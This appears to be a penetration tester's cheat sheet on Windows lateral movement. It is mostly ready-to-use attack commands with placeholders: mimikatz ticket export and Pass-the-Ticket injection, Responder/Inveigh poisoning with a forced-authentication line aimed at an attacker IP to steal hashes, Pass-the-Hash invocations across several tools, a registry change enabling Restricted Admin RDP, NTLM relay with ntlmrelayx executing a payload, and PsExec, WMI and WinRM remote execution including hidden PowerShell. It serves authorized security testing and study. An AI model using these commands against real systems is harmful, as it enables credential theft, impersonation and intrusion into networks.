# Windows Lateral Movement

# **Kerberos Pass-the-Ticket**

Kerberos Pass-the-Ticket (PtT) is a post-exploitation technique to impersonate users by injecting valid Kerberos tickets (TGT or TGS) into a session. Rather than stealing plaintext credentials or NTLM hashes, PtT allows lateral movement and privilege escalation by reusing authentication tokens extracted from memory (e.g., via LSASS).

This technique exploits the trust inherent in Kerberos authentication and is particularly powerful in environments where credential hygiene is poor or ticket lifetimes are long.

> When using a tool from Linux, verify whether it supports Kerberos ticket-based authentication. Typically, this involves setting the `KRB5CCNAME` environment variable to point to a `.ccache` ticket file.
> 

| **Action** | **Description** |
| --- | --- |
| Export tickets:
`.\mimikatz.exeprivilege::debugsekurlsa::tickets /export`

Check the ticket files created:
`dir *.kirbi` | Extracts Kerberos tickets from memory and saves them as `.kirbi` files.

The tickets are dumped from LSASS memory, so administrative privileges are required. |
| Inject ticket:
`.\mimikatz.exeprivilege::debugkerberos::ptt <ticket-filename>.kirbi`

Check if the ticket was injected:
`klist` | Loads a Kerberos ticket into memory for the current session (Pass-the-Ticket). |

# **LLMNR & NBT-NS Poisoning**

| **Action** | **Description** |
| --- | --- |
| `sudo responder -I <network-interface>` | (Linux) Launches [Responder](https://github.com/lgandx/Responder) with default settings. Output is shown in the terminal and saved to `/usr/share/responder/logs`. |
| `.\Inveigh.exe`

Useful commands:

`GET NTLMV2UNIQUEGET NTLMV2USERNAMES` | (Windows) Runs the C# version of [Inveigh](https://github.com/Kevin-Robertson/Inveigh). Requires transferring or compiling the executable.

Command help is available by pressing ESC and typing `HELP`. |
| `Import-Module .\Inveigh.ps1Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y` | (Windows) Uses the PowerShell version of [Inveigh](https://github.com/Kevin-Robertson/Inveigh).

Easier to set up, but considered legacy and less flexible than the compiled version. |
| `dir \\<attack-ip>\test.txt` | (Windows) With code execution as a user (but without knowing the password), we can force the system to authenticate to us, steal the hash and crack it offline. |

> Responder and Inveigh need `Super User` and `Administrator` privileges respectively. LLMNR operates over UDP port 5355, while NBT-NS uses UDP port 137.
> 

# **NTLM Pass-the-Hash**

To use Pass-the-Hash (PtH) for lateral movement, the following conditions must be met:

- The authenticating user must have local administrator rights on the target system.
- The `ADMIN$` administrative SMB share must be available and accessible.
- File and Printer Sharing must be enabled, and the SMB service (typically TCP port 445) must be reachable.

| **Action** | **Description** |
| --- | --- |
| `nxc ... -H <ntlm-hash>

evil-winrm ... -H <ntlm-hash>

xfreerdp ... /pth:<ntlm-hash>

smbclient ... --pw-nt-hash <ntlm-hash>

impacket-wmiexec -hashes :<ntlm-hash>` | These are some of the tools with PtH support. |
| `mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /ntlm:<ntlm-hash> /domain:<domain>" /run:powershell` | NTLM PtH attack from Windows using Mimikatz. Grants a shell. |
| `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` | Enables Pass-the-Hash over RDP via Restricted Admin Mode, but requires admin rights on the target to work. |

# PsExec

To use PsExec for lateral movement, the following conditions must be met:

- The authenticating user must be a local administrator on the target.
- The `ADMIN$` SMB share must be available.
- File and Printer Sharing must be enabled.

> Make sure to accept the EULA by running `PsExec64.exe -accepteula`, otherwise you can’t use the utility.
> 

| **Action** | **Description** |
| --- | --- |
| `impacket-psexec <user>:'<pass>'@<target> "<cmd>"` | **Linux**: Executes commands remotely on a target using PsExec with provided credentials. |
| `.\PsExec64.exe -i \\<target> -u <domain>\<user >-p <password> cmd` | **Windows**: Creates an interactive shell session on the remote host using PsExec. |

> Since SysInternals suite isn’t installed on Windows hosts by default, we may need to transfer PsExec to our attacking Windows host. `PsExec.exe` can be download [here](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec).
> 

# **SMB Net-NTLM Relay**

**For this attack to work, the SMB service on the target machine must have SMB signing disabled.** SMB signing is a security feature that ensures the authenticity and integrity of SMB messages, preventing tampering or relaying by requiring cryptographic verification.

**Additionally, we want the user whose credentials are being relayed to have administrative privileges on the target machine,** as this level of access is required to execute code remotely via the SMB protocol.

**And lastly, there’s a limitation where NTLM hashes can’t be relayed back to the same machine they originated from, meaning the relay target must be a different host.**

| **Action** | **Description** |
| --- | --- |
| `nxc smb <relay-target>

sudo nmap --script=smb2-security-mode.nse -p445 <relay-target>` | For the attack to work, the relay target must have SMB signing disabled or not enforced. |
| `impacket-ntlmrelayx --no-http-server -smb2support -t <relay-target> -c "<payload>"` | This sets up an SMB server that captures and relays NTLM hashes to the target and automatically executes the specified payload.

No need to run Responder alongside. |

# **WMI (Windows Management Instrumentation)**

To use WMI remotely, the user must be a member of the **local Administrators** group on the target machine.

| **Action** | **Description** |
| --- | --- |
| `impacket-wmiexec <user>:"<password>"@<target> "<system command>"` | **Linux**: Executes commands remotely on a target using WMI over DCOM with provided credentials. |
| Create a credential:
`$user = '<username>';
$pass = '<password>';
$secureString = ConvertTo-SecureString $pass -AsPlaintext -Force;
$cred = New-Object System.Management.Automation.PSCredential $user, $secureString;`

Create a CIM session:
`$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName <target> -Credential $cred -SessionOption $options
$command = '<command>';`

Invoke:`Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$command};` | **Windows**: Creates a WMI session using CIM over DCOM and runs a command on the remote host. |

# WinRM (Windows Remote Management)

To use WinRM, the user must belong to either the **local Administrators** group or the **Remote Management Users** group on the target system.

| **Action** | **Description** |
| --- | --- |
| `evil-winrm -i <target> -u <user> -p <password>` | **Linux**: Opens an interactive WinRM shell on the target using provided credential |
| `nxc winrm <target-ip> -u <user> -p <password>` | **Linux**: Executes commands on a remote host over WinRM with given credentials. |
| `Test-WSMan -ComputerName <target>` | **Windows**: Tests connectivity to the WinRM service on the target machine. |
| `winrs -r:<target> -u:<username> -p:<password> "cmd /c <command>"`

For PowerShell payloads:
`"powershell -nop -w hidden -c '<command>'"` | **Windows**: Runs commands remotely over WinRM. |
| Create a credential:
`$user = '<username>';
$pass = '<password>';
$secureString = ConvertTo-SecureString $pass -AsPlaintext -Force;
$cred = New-Object System.Management.Automation.PSCredential $user, $secureString;`

Create a WinRM session:
`New-PSSession -ComputerName <target> -Credential $cred;`

Enter the session:
`Enter-PSSession <session-id>` | **Windows**: Establishes and enters a remote PowerShell session over WinRM securely. |